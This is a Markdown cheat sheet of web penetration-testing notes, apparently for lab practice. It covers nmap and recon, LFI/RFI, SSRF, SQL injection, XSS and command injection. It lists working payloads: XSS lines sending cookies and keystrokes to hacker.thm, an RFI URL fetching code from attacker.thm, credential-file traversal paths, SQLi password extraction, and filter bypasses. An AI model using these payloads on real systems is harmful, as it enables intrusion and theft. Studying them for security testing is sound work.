# Web

# Table of Contents
* [Tools](#Tools)
* [F12](#F12)
* [Recon](#Recon)
* [Nmap](#Nmap)
* [Protocols](#Protocols)
* [Headers](#Headers)
* [OAuth2.0](#OAuth2.0)
* [Content Discovery](#Content-Discovery)
* [Subdomain Enumeration](#Subdomain-Enumeration)
* [FFUF](#FFUF)
* [PHP](#PHP)
* [IDOR](#IDOR)
* [HTTP 302](#HTTP-302)
* [HTTP Parameter Pollution](#HTTP-Parameter-Pollution)
* [File Inclusion](#File-Inclusion)
* [SSRF](#SSRF)
* [SQL Injection](#SQL-Injection)
* [XSS Injection](#XSS-Injection)
* [Command Injection](#Command-Injection)
* [XML Injection](#XML-Injection)
* [Clickjacking](#Clickjacking)
* [AWS](#AWS)

## Tools
* [HackBar](https://chrome.google.com/webstore/detail/hackbar/ginpbkfigcoaokgflihfhhmglmbchinc) : A simple security audit / Penetration test tool for testing sql injections, XSS holes and site security.
* [Wayback Machine](https://archive.org/web/) : Explore web pages saved over time.
* [RequestBin](https://requestbin.com/) : Get a URL that collects requests you send it. (Can be used with XSS to get admin cookies)
* [Wappalyzer](https://www.wappalyzer.com/): Identify technologies on websites.
* [User-Agent Switcher and Manager](https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher/)
* [ffuf](https://github.com/ffuf/ffuf): Fast web fuzzer written in Go.
* [dirb](https://www.kali.org/tools/dirb/): Scan the web server for directories using a dictionary file.
* [gobuster](https://github.com/OJ/gobuster): Directory/File, DNS and VHost busting tool written in Go.
* [dnsrecon](https://www.kali.org/tools/dnsrecon/): DNS enumeration script.
* [Sublist3r](https://github.com/aboul3la/Sublist3r): Fast subdomains enumeration tool for penetration testers.
* [xsshunter](https://xsshunter.com/)
* [Burp Suite](https://portswigger.net/burp)
  * Proxy
    * [FoxyProxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/)
    * Scoping: In "Target" tab, right-click the target and choose "Add To Scope" to disable logging of out of scope traffic; Go to "Proxy Options" and select "And URL Is in target scope" from the Intercept Client Requests section so proxy only intercept the target.
  * Repeater: Craft and/or relay intercepted requests to a target at will.
  * Intruder: Burp's builtin fuzzing tool.
    * Sniper: Takes one set of payloads. Good for single-position attacks.
    * Battering Ram: Takes one set of payloads. Puts the same payload in every position.
    * Pitchfork: Takes up to 20 sets of payloads and uses one payload set per position and iterates through them all once. It will stop when one of the lists is complete.
    * Cluster Bomb: Takes up to 20 sets of payloads and uses one payload set per position and iterates through each payload set individually (iterate through every possible combination of payloads).
  * Sequencer: Measure the entropy of "tokens".
  * [Collaborator](https://portswigger.net/burp/documentation/collaborator)
    1. Burp sends a payload to the application containing a URL that uses a random subdomain of one of the Collaborator domains, for example: `param=http://f294gchg2la...r9gf.oastify.com/`
    2. Due to its programmed behavior (intended or otherwise), the application fetches the contents of the URL. To do this, it will first perform a DNS lookup on the random subdomain, and then perform an HTTP request.
    3. The DNS lookup and the HTTP request are received by the Collaborator server. Both interactions contain the random data that Burp placed into the Collaborator subdomain.
    4. Burp polls the Collaborator server and asks: "Did you receive any interactions for my payload?", and the Collaborator returns the interaction details.
    5. Burp reports the external service interaction to the Burp user, including the full interaction messages that were captured by the Collaborator server.
* [Ettercap](https://www.ettercap-project.org/): For MITM attacks.
* [Bettercap](https://www.bettercap.org/): For network reconnaissance and MITM attacks.
* [Hydra](https://github.com/vanhauser-thc/thc-hydra): Password cracker.
  * `hydra -l <username> -P <wordlist> -s <port> <server> <service>`

## F12
* Check Network header/response
* Use console to do js function overwrite
* Debugger
  * Use "Pretty Print" option (looks like 2 braces {}) to make minimised file readable
  * Click on line number to set break points

## Recon
* Passive Recon
  * `whois DOMAIN_NAME`: The WHOIS server replies with various information related to the domain requested.
  * `nslookup OPTIONS DOMAIN_NAME SERVER`: Name Server Look Up, ex. `nslookup -type=A google.com 1.1.1.1`
    * Options
      * A: IPv4 Addresses
      * AAAA: IPv6 Addresses
      * CNAME: Canonical Name
      * MX: Mail Servers
      * SOA: Start of Authority
      * TXT: TXT Records
    * Server
      * Cloudflare public DNS server: 1.1.1.1 and 1.0.0.1
      * Google public DNS server: 8.8.8.8 and 8.8.4.4
      * Quad9 public DNS server: 9.9.9.9 and 149.112.112.112
  * `dig @SERVER DOMAIN_NAME TYPE`: Domain Information Groper, ex. `dig google.com MX` 
  * [DNSDumpster](https://dnsdumpster.com/): A free domain research tool that can discover hosts related to a domain.
  * [Shodan.io](https://www.shodan.io/): It tries to connect to every device reachable online to build a search engine of connected "things".
* Active Recon
  * `ping`: ex. `ping -c 5 MACHINE_IP`
  * `traceroute MACHINE_IP`
  * `telnet MACHINE_IP PORT`
  * `nc MACHINE_IP PORT`
    * Listen on a port: `nc -vnlp PORT`

## Nmap
* `-n`: no DNS lookup
* `-R`: reverse-DNS lookup for all hosts
* `--dns-servers DNS_SERVER`: Use a specific DNS server
* `-sn`: host discovery only, no port-scanning
* `-sL`: List hosts that Nmap will scan without scanning them. `nmap -sL TARGETS` where TARGETS can be `MACHINE_IP scanme.nmap.org example.com` or `10.11.12.15-20` or `MACHINE_IP/30`
* `--reason`: Explains how nmap made its conclusion
* `-v`: verbose
* `-vv`: Very verbose
* `-d`: Debugging
* `-dd`: More details for debugging
* Live Host Discovery
  * ARP Scan: `sudo nmap -PR -sn MACHINE_IP/24`
    * This is possible only if you are on the same subnet as the target systems. ARP query (link layer) is used to get the MAC address.
  * ICMP Echo Scan: `sudo nmap -PE -sn MACHINE_IP/24`
    * Respond to ping (ICMP Type 8/Echo) with a ping reply (ICMP Type 0)
  * ICMP Timestamp Scan: `sudo nmap -PP -sn MACHINE_IP/24`
    * Respond to timestamp request (ICMP Type 13) with timestamp reply (ICMP Type 14)
  * ICMP Address Mask Scan: `sudo nmap -PM -sn MACHINE_IP/24`
    * Respond to address mask queries (ICMP Type 17) with address mask reply (ICMP Type 18)
  * TCP SYN Ping Scan: `sudo nmap -P22,80,443 -sn MACHINE_IP/30`
    * An open port will reply with a SYN/ACK while a closed port will reply with RST
    * Privileged users don't need to complete the 3-way handshake (SYN -> SYN/ACK -> RST)
  * TCP ACK Ping Scan: `sudo nmap -PA22,80,443 -sn MACHINE_IP/30`
    * Live host will reply with RST
  * UDP Ping Scan: `sudo nmap -PU53,161,162 -sn MACHINE_IP/30`
    * An open port will reply with nothing while a closed port will reply with ICMP Destination Unreachable (Type 3, Code 3)
* Basic Port Scans
  * TCP Connect Scan: `nmap -sT MACHINE_IP`
    * It conducts scans by completing the TCP 3-way handshake, attempt to connect to the 1000 most common ports by default
  * TCP Syn Scan: `sudo nmap -sS MACHINE_IP`
    * It tears down the connection once it receives a response from server (SYN -> SYN/ACK -> RST)
  * UDP Scan: `sudo nmap -sU MACHINE_IP` 
    * * An open port will reply with nothing while a closed port will reply with ICMP Destination Unreachable (Type 3, Code 3)
  * `-p-`: all ports
  * `-p1-1023`: Scan ports 1 to 1023
  * `-F`: 100 most common ports
  * `-r`: Scan ports in consecutive order
  * `-T<0-5>`: -T0 is the slowest and T5 the fastest (0:paranoid, 1:sneaky, 2:polite, 3:normal, 4:aggressive, 5:insane)
  * `--max-rate 50`: rate <= 50 packets/sec
  * `--min-rate 15`: rate >= 15 packets/sec
  * `--min-parallelism 100`: at least 100 probes in parallel
* Advanced Port Scans
  * TCP Null Scan: `sudo nmap -sN MACHINE_IP`
    * No flag is set. An open port will reply with nothing (or firewall blocked the packet) while a closed port will reply with RST,ACK.
  * TCP FIN Scan: `sudo nmap -sF MACHINE_IP`
    * FIN flag is set. An open port will reply with nothing (or firewall blocked the packet) while a closed port will reply with RST,ACK.
  * TCP Xmas Scan: `sudo nmap -sX MACHINE_IP`
    * FIN,PSH,URG flags are set. An open port will reply with nothing (or firewall blocked the packet) while a closed port will reply with RST,ACK.
  * The 3 scans above are efficient towards a stateless firewall because a stateless firewall will check if the SYN flag is set to detect a connection attempt. A stateful firewall will practically block all such crafted packets.
  * TCP Maimon Scan: `sudo nmap -sM MACHINE_IP`
    * FIN,ACK flags are set. The target should send RST whether port is open or close. Certain BSD-derived systems drop the packet if it is an open port. 
  * TCP ACK Scan: `sudo nmap -sA MACHINE_IP`
    * ACK flag is set. The target will responde with RST whether port is open or close. This scan is usefull to detect a firewall because you will learn which ports were not blocked by the firewall.
  * TCP Window Scan: `sudo nmap -sW MACHINE_IP`
    * It examines the TCP Window field of the RST packets returned, revealing open ports on certain systems. The target will responde with RST whether port is open or close.
  * Custom TCP Scan: `sudo nmap --scanflags URGACKPSHRSTSYNFIN MACHINE_IP`
  * Spoofed Source IP: `sudo nmap -S SPOOFED_IP MACHINE_IP`
  * Spoofed MAC Address: `--spoof-mac SPOOFED_MAC`
  * Decoy Scan: `nmap -D DECOY_IP,ME MACHINE_IP`
  * Idle (Zombie) Scan: `sudo nmap -sI ZOMBIE_IP MACHINE_IP`
    1. Trigger the idle host to respond and record current IP ID on the idle host
    2. Send a SYN packet to a TCP port on the target (If target respond with RST, IP ID is not incremented; If target respond with SYN/ACK and idle host respond with RST, IP ID is incremented by 1)
    3. Trigger the idle machine to respond again and compare the new IP ID. If difference is 1, then the port is closed or filtered; if difference is 2, then the port is open
  * Fragment IP data into 8 bytes: `-f`
  * Fragment IP data into 16 bytes: `-ff`
  * `--source-port PORT_NUM`: Specify source port number
  * `--data-length NUM`: Append random data to reach given length
* Post Port Scans
  * `-sV`: Determine service/version info on open ports
  * `-sV --version-light`: Try the most likely probes (2)
  * `-sV --version-all`: Try all available probes (9)
  * `-O`: Detect OS (might not be accurate)
  * `--traceroute`: Run traceroute to target (It starts with high TTL and keeps decreasing it unlike the standard traceroute)
  * `--script=SCRIPTS`: Nmap scripts to run
  * `-sC` or `--script=default`: Run default scripts
  * `-A`: Equivalent to `-sV -O -sC --traceroute`
  * `-oN`: Save output in normal format
  * `-oG`: Save output in grepable format
  * `-oX`: Save output in XML format
  * `-oA`: Save output in normal, grepable, XML format

## Protocols
* FTP: default port 21, File Transfer, Cleartext
* HTTP: default port 80, Website, Cleartext
* IMAP: default port 143, Email (Mail Delivery Agent), Cleartext
* POP3: default port 110, Email (Mail Delivery Agent), Cleartext
* SMTP: default port 25, Email (Mail Transfer Agent), Cleartext
* Telnet: default port 23, Remote Access, Cleartext

## Headers
* [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) (CSP)
  * Control resources the user agent is allowed to load for a given page
  * Helps guard against cross-site scripting attacks
  * `unsafe-inline`: Allow use of inline resources
* [Cross-Origin Resource Sharing](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) (CORS)
  * Allows a server to indicate any origins (domain, scheme, or port) other than its own from which a browser should permit loading resources
  * `Access-Control-Allow-Origin`: Doesn't allow specifying multiple origins, can only specify one origin or wildcard
    * Specify multiple origin -> Dynamic generation - Dynamically inspect incoming origin header from the browser and decide if it is trusted
  * `Access-Control-Allow-Credentials`
    * If a request includes a credential (most commonly a `Cookie` header) and the response includes an `Access-Control-Allow-Origin: *` header (that is, with the wildcard), the browser will block access to the response, and report a CORS error in the devtools console.
  * Null origin

## OAuth2.0
* [OAuth grant types](https://portswigger.net/web-security/oauth/grant-types)
* Recon
  * Send GET request to `/.well-known/oauth-authorization-server` and `/.well-known/openid-configuration` for information such as additional features
* Insufficient URI validation
* Referer header leaks code and state: After authorization code grant there should be no code and state in the referer header.
* Access token stored in browser history
* Access token leakage
* Client secret leakage
* State
  * Lack of state
  * Not enough entropy
  * Reuse
  * Invalid state validation: Change state to an invalid value or delete it.
* Implicit grant coercion: Change the `response_type` from `code` to `token`.  

## Content Discovery
* Manual
  * /robots.txt: Used by websites to communicate with web crawlers about which areas of the website should not be processed or scanned.
  * Favicon: The small picture in the website tab. If the website developer doesn't change it to a custom one, the favicon of the framework used by the website might be displayed.
    * `curl <favicon url> | md5sum`
    * Then lookup the md5 hash in [OWASP favicon database](https://wiki.owasp.org/index.php/OWASP_favicon_database)
  * /sitemap.xml: Gives a list of every file the website owner wishes to be listed on a search engine.
  * HTTP headers: Use `curl <website url> -v` to get the headers.
  * Framework: Check the framework documentation.
* OSINT
  * Google Hacking/Dorking: Google's advanced search engine
    * site:example.com
    * inurl:admin
    * filetype:pdf
    * intitle:admin
  * [Wayback Machine](https://archive.org/web/): Explore web pages saved over time.
  * [Wappalyzer](https://www.wappalyzer.com/): Identify technologies on websites.
  * Github
  * S3 Buckets: Storage service provided by Amazon AWS. The owner of the files can set permission to public, private and writable.
    * http(s)://{name}.s3.amazonaws.com
    * Common terms: {name}-assets, {name}-www, {name}-public, {name}-private, ...
* Automated
  * [SecLists](https://github.com/danielmiessler/SecLists): A wordlist that includes usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and more.
  * [ffuf](https://github.com/ffuf/ffuf)
    * `fuff -w <wordlist path> -u <url>/FUZZ`
  * [dirb](https://www.kali.org/tools/dirb/)
    * `dirb <url> <wordlist path>` 
  * [gobuster](https://github.com/OJ/gobuster)
    * `gobuster dir --url <url> -w <wordlist path>`

## Subdomain Enumeration
* https://en.wikipedia.org -> `en` is a subdomain of `wikipedia.org`
* SSL/TLS Certificate Transparency (CT) logs: Publicly accessible logs of every SSL/TLS certificate created for a domain name. The purpose is to stop malicious and accidentally made certificates from being used.
  * https://crt.sh/
  * https://transparencyreport.google.com/https/certificates
* `-site:www.domain.com site:*.domain.com` would only contain results leading to domain.com but excluding any links to www.domain.com
* DNS bruteforce: `dnsrecon -t brt -d <domain>`
* `./sublist3r.py -d <domain>`
* Some subdomains aren't hosted in publically accessible DNS results, such as development versions or administration portals. These DNS records could be kept on a private DNS server or recorded on the developer's machines in /etc/hosts file (C:\windows\system32\drivers\etc\hosts for Windows). The server knows which website the client wants from the **Host** header.
  * `fuff -w <wordlist path> -H "Host:FUZZ.<domain>" -u http://MACHINE_IP`: The -H switch adds/edits a header, using the FUZZ keyword in the space where a subdomain would normally go.
  * Add -fs {size} to filter out any results of the specified size.

## FFUF
* `-w`: Wordlist file path and (optional) keyword separated by colon.
  * /path/to/wordlist:KEYWORD
* `-u`: Target URL.
* `-H`: Header `"Name: Value"`, separated by colon.
* `-X`: HTTP method to use. Default value is GET.
* `-d`: POST data.
* `-fs`: Filter HTTP response size.
* `-fc`: Filter HTTP status codes from response.
* `-mr`: Match regexp.
* [Example Usage](https://github.com/ffuf/ffuf#example-usage)

## PHP
* [Magic Hashes](https://github.com/spaze/hashes)
  * For php, `'0e123' == '00e456' == '0'` since they all translate to float 0 (0e followed by digits is interpreted as scientific notation)
* `$_REQUEST` variable
  * An associative array that by default contains the contents of `$_GET`, `$_POST` and `$_COOKIE`.
  * If the same key name is used for both the query string and POST data, it will favour POST data field.
  * Can use `curl -d <POST data>` to add a parameter and overwrite the query string value if the application logic uses `$_REQUEST` to retrieve data.

## IDOR
* Insecure Direct Object Reference, a type of access control vulnerability
* It can occur when input data is not validated on the server-side to confirm the requested object belongs to the user requesting it
* Example: Changing the id number in http://online-service.thm/profile?user_id=1305

## HTTP 302
* **Moved Temporarily**, 可以簡單的理解為該資源原本確實存在，但已經被臨時改變了位置；換而言之，就是請求的資源暫時駐留在不同的URI下。
* `curl` only redirects when adding parameter `-L`
* Use `curl` to view the original page

## HTTP Parameter Pollution
* [Testing for HTTP Parameter Pollution](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution)
* Test the application's response to receiving multiple HTTP parameters with the same name
* Some servers concatenate all occurences with a comma, others take the last occurence

## File Inclusion
* Path (Directory) Traversal: It occurs when user input is not validated and passed to a function such as `file_get_contents`.
  * `/etc/issue`
  * `/etc/profile`
  * `/proc/version`
  * `/etc/passwd`
  * `/etc/shadow`
  * `/root/.bash_history`
  * `/var/log/dmessage`
  * `/var/mail/root`
  * `/root/.ssh/id_rsa`
  * `/var/log/apache2/access.log`
  * `C:\boot.ini`
* Local File Inclusion (LFI): Using PHP functions such as `include`, `require`, `include_once`, `require_once`
  * `../../../../etc/passwd`
  * !`%00` no longer works with PHP 5.3.4 and above! If a file type is specified for the include function (ex. adding .php at the end), add a NULL byte (%00 or 0x00) at the end: `../../../../etc/passwd%00`
  * If keywords are being filtered (ex. `/etc/passwd`), there are two methods to bypass it: Null Byte `%00` and current directory trick `/etc/passwd/.`
  * If web application replaces `../` with empty string, use `....//....//....//....//etc/passwd` because PHP filter only matches and replaces the first subset string `../` it finds and doesn't do another pass: ..<s>../</s>/..<s>../</s>/..<s>../</s>/..<s>../</s>/etc/passwd -> ../../../../etc/passwd
  * If the developer forces the include to read from a defined directory, include the directory in the payload.
* Remote File Inclusion (RFI): Inject an external URL into `include` function. One requirement is that `allow_url_fopen` option needs to be `on`.
  * `http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt`

## SSRF
* Server-Side Request Forgery. Allows a malicious user to cause the webserver to make an additional or edited HTTP request to the source of the attacker's choosing.
* Blind SSRF: No information is returned to the attacker's screen. Use an external HTTP logging tool such as requestbin.com, your own HTTP server or Burp Suite's Collaborator client to monitor requests.
```
       http://website.thm/stock?url=http://api.website.thm/api/usr             http://api.website.thm/api/usr
       ---------------------------------------------------------->             ------------------------------> 
Hacker                                                             website.thm                                 api.website.thm
       <----------------------------------------------------------             <------------------------------
       Website returns user data to Hacker                                     API Server returns user data to
                                                                               the website instead of stock
                                                                               information
```
* `http://website.thm/stock?url=/../user`
* When subdomain can be controlled: `http://website.thm/stock?server=api.website.thm/api/usr&x=&id=123` will request `http://api.website.thm/api/usr?x=.website.thm/api/stock/item?id=123` where `&x=` is used to stop the remaining path from being appended to the end of the attacker's URL.
* Finding an SSRF
  * A full URL is used in a parameter in the address bar
  * A hidden field in a form
  * A partial URL such as just the hostname
  * Path of the URL
* Bypass SSRF defenses
  * Deny List: If localhost and 127.0.0.1 is denied, use 0, 0.0.0.0, 0000, 127.1, 127.*.*.*, 2130706433, 017700000001 or subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as 127.0.0.1.nip.io
    * In cloud environment, 169.254.169.254 contains metadata for the deployed cloud server.
  * Allow List: An URL used in a parameter must begin with https://website.thm. Create a subdomain on an attacker's domain name, such as https://website.thm.attackers-domain.thm.
  * Open Redirect

## SQL Injection
* `'or 1 = 1 -- `
* 選取特定資料 : `'or 1 = 1 limit 1,1 -- `
  * 從offset=1開始選取前50筆資料(略過最前面1筆)
  * `limit 1,50`
* Wildcard `%`
  * `select * from users where username like 'a%';`: Returns any rows with username beginning with the letter a. 
* Blind sql injection
  * 有時候資料庫查詢只會顯示成功或失敗，不會顯示資料
  * 透過True/Flase回傳去判斷
    * `id = 'admin' and ascii(mid(password, 1, 1))>0 --` => True
    * `id = 'admin' and ascii(mid(password, 1, 1))>100 --` => False
    * `mid()` : 從字串索引值 start 開始截取共 length 長度的字串
  * 沒有回傳可以透過時間
    * `id = 'admin' and if(ascii(mid(password,1,1))>0, sleep(5), 1)=1`
    * if(condition, when_true, when_false)
  * `SUBSTRING(string, start, length)`
    * `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
  * Confirm table exists: `xyz' AND (SELECT 'a' FROM users LIMIT 1)='a`
  * Get length of password: `xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`
* Bypass WAF
  * 對大小寫不敏感
  * 空白
    * /**/,%09, %0a, %0b, %0c, %0d, %a0
    * OR(1=1)
  * OR => ||, AND => &&
    * &直接傳過去是有特殊涵意的，例如?key1=value1&key2=value2
    * 用%26取代
  * = => LIKE
  * LIMIT 0,1 => LIMIT 1 OFFSET 0
* Examine Database
  * Microsoft, MySQL: `SELECT @@version`
  * Oracle: `SELECT * FROM v$version`
  * PostgreSQL: `SELECT version()`
* `user()` : 回傳使用者名稱
* `database()`: Get database name
* Determine number of columns
  * `' ORDER BY 1--`
  * `' ORDER BY 2--`
  * `' ORDER BY 2--`
  * etc.
  * `' UNION SELECT NULL--`
  * `' UNION SELECT NULL,NULL--`
  * `' UNION SELECT NULL,NULL,NULL--`
  * etc.
* Determine data type
  * `' UNION SELECT 'a',NULL,NULL--`
  * `' UNION SELECT NULL,'a',NULL--`
  * `' UNION SELECT NULL,NULL,'a'--`
* Retrieving multiple values with a single column
  * Oracle: `'foo'||'bar'`
  * Microsoft: `'foo'+'bar'`
  * PostgreSQL: `'foo'||'bar'`
  * MySQL: `'foo' 'bar'`, `CONCAT('foo','bar')`
* `information_schema`
  * SQL內建的資料庫，會儲存資料庫內部的資訊，例如所有table/column name
  * 透過leak information_schema取得想要的資料庫
  * databasename is at `information_schema.schemata`
  * tablename is at `information_schema.tables`
  * columnname is at `information_schema.columns`
  * leak database name
    * `'union select schema_name,1 from information_schema.schemata #`
    * can add `limit` to find certain information
  * leak table name
    * `'union select table_name,1 from information_schema.tables where table_schema like '$databasename'#`
  * leak column name
    * `'union select column_name,1 from information_schema.columns where table_name like '$tablename'#`
  * With the 3 information above found, leak the information
    * `'union select $columnname,1 from $databasename.$tablename#` 
* Oracle
  * Every `SELECT` statement must specify a table to select `FROM`. There is a built-in table on Oracle called dual which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual`
  * leak table name
    * `SELECT table_name FROM all_tables`
  * leak column name
    * `SELECT column_name FROM all_tab_columns WHERE table_name = ''`

## XSS Injection
* An injection attack where malicious JavaScript gets injected into a web application.
* Types of XSS
  * Reflected XSS: Attack script is reflected back to the user as part of a page from the victim site
    1. Victim visits malicious website
    2. Victim receives page with malicious link, ex. `http://victim.com/search.php?term=<script>...</script>`
    3. Victim clicks on link
    4. Victim receives page with injected scripts, ex. echo search term in response `<html>...Results for <script>...</script>`
    5. Victim sends valuable data to attacker
  * Stored XSS: The XSS payload is stored on the web application
    1. Attacker uploads malicious content to victim server
    2. Victim requests page from victim server
    3. Victim receives page with malicious content
    4. Victim sends valuable data to attacker
  * DOM Based XSS: The JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. (vulnerability exists in client-side code rather than the server-side code)
    * Look for parts of the code that access certain variables that an attacker can have control over, ex. `window.location.x`
    * Then see how they are handled and whether the values are ever written to the web page's DOM or passed to functions like `eval()`
    * Example, use malicious input such as `<img src=x onerror=alert()>`:
      ```javascript
      var search = document.getElementById('search').value;
      var results = document.getElementById('results');
      results.innerHTML = 'You searched for: ' + search;
      ```
    * [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader)
    * Look for sinks such as `document.write` and `innerHTML`.
      * `innerHTML` doesn't allow `<script>` or `<svg onload>`, use `<img ...>` and `<iframe>` instead.
  * Blind XSS: Similar to a stored XSS but you can't see the payload working or be able to test against yourself first.
    * [xsshunter](https://xsshunter.com/)
* Payloads
  * Proof of concept: `<script>alert('hello');</script>`
  * Session Stealing: `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie) );</script>`
    * `btoa()`: Creates a Base64-encoded ASCII string from a "string" or binary data.
  * Key Logger: `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
  * Business Logic: `<script>user.changeEmail('attacker@hacker.thm');</script>`
  * Payload is inside other tags: `"><script>alert('hello');</script> 
    * `<h2>Hello, <input value="test"></h2>` -> `<h2>Hello, <input value=""><script>alert('hello');</script>"></h2>`
  * Payload is in textarea tags: `</textarea><script>alert('hello');</script>`
    * `<h2>Hello, <textarea>test</textarea></h2>` -> `<h2>Hello, <textarea></textarea><script>alert('hello');</script></textarea></h2>`
  * innerHTML: `';alert('hello');//`
    * `<script>document.getElementsByClassName('name')[0].innerHTML='test'</script>` -> `<script>document.getElementsByClassName('name')[0].innerHTML='';alert('hello');//';`
  * `script` is filterd: `<sscriptcript>alert('hello');</sscriptcript>`
  * Escape IMG tag and `<`, `>` are filtered: `/images/cat.jpg" onload="alert('hello');`
    * `<img src="images/cat.jpg">` -> `<img src="/images/cat.jpg" onload="alert('hello');">`
  * Chrome disabled `alert()` for cross-origin iframe: `print()`
  * Polyglots

## Command Injection
* PHP functions that interact with the operating system to execute commands via shell: `exec`, `passthru`, `system`
* The shell operators `;`, `&`, `|`, `&&` will combine two (or more) system commands and execute them both
* Blind Command Injection: No output noticeable
  * Use payloads that cause some time delay: `ping` and `sleep`. Using `ping` will make the application hang for x seconds in relation to how many pings specified.
  * Forcing output: `>` + `cat`
  * `curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami`
* Verbose Command Injection: `ping` or `whoami`
* Useful Payloads
  * Linux
    * `whoami`, `ls`, `ping`, `sleep`, `nc`
  * Windows
    * `whoami`, `dir`, `ping`, `timeout` 
* Remediation
  * `<input type="text" id="ping" name="ping" pattern="[0-9]+"></input` will only accept a specific pattern of characters (0-9)
  * Sanitisation: `<?php if(!filter_input(INPUT_GET, "number", FILTER_VALIDATE_NUMBER)) {}` 
* [Cheat sheet](https://github.com/payloadbox/command-injection-payload-list)

## XML Injection

## Clickjacking
* Proof of Concept
  ``` html
  <!DOCTYPE html>
  <html>
  <head>
  <title>Clickjacking PoC</title>
  </head>
  <body>
  <p>Website is vulnerable to Clickjacking!</p>

  <iframe src="<website>" style="height:100%;width:100%;position:absolute;" height="100%" width="100%" style="opacity: 0.5;"></iframe>

  </body>
  </html>
  ```

## AWS
* [Confused Deputy](https://docs.aws.amazon.com/IAM/latest/UserGuide/confused-deputy.html)
